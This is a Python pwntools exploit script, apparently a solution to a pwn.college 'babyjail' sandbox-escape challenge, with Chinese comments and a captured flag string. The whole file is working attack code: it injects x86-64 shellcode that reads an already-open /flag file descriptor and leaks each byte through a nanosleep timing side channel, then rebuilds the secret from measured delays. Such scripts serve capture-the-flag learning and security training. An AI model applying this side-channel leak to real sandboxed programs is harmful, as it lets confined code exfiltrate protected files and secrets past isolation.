from pwn import *
import os
import time

# 这题需要的结构体是合计16位
# 两个long型数字
# 第一个是秒, 第二个是纳秒
# 因为有可能申请的内存区域会被占用, 所以有一定概率会出EOF
# 所以多试几次

# 
# pwn_college{oMk8xeuzn8bbdKXhw_cxruv73Ky.dFTNxwiMxkzW}
# 一会对照一下, 因为可能有一些差
context(os='linux', arch='amd64',)#log_level='debug')

def getshellcode(num):
    shellcode = b""
    shellcode += asm("xor rax, rax")
    shellcode += asm("xor rdi, rdi")
    shellcode += asm("xor rsi, rsi")
    shellcode += asm("xor rdx, rdx")
    shellcode += asm("mov rax, 0")
    shellcode += asm("mov rdi, 3")
    shellcode += asm("lea rsi, [rip+0x30]")
    shellcode += asm("mov rdx, {}".format(100))
    shellcode += asm("syscall")
    shellcode += asm("mov rax, 35")
    shellcode += asm("mov edi, dword ptr [rsi+{}]".format(num))
    shellcode += asm("push 0")
    shellcode += asm("and rdi, 0x000000ff")
    #shellcode += asm("sub rdi, 0x40")
    shellcode += asm("push rdi")
    shellcode += asm("mov rdi, rsp")
    shellcode += asm("mov rsi, rsp")
    shellcode += asm("syscall")
    #shellcode += asm('.string "\a"')
    return shellcode

if __name__ == '__main__':
    stderr = open("/tmp/err", "wb")
    string = ''
    for i in range(53):
        io = process(["./babyjail_level11_testing1", "/flag"], stderr=stderr)
        io.recvuntil(b"stdin\n")
        start = time.time()
        io.sendline(getshellcode(i))
        io.recvall()
        #time.sleep(0.1)
        stop = time.time()
        print(stop-start+0x40)
        #io.interactive()
        io.close()
        print(chr(int(stop-start)))    # 前面减去了0x40减少时间
        string += chr(int(stop-start)) # 字符集从0x41开始
    print(string)
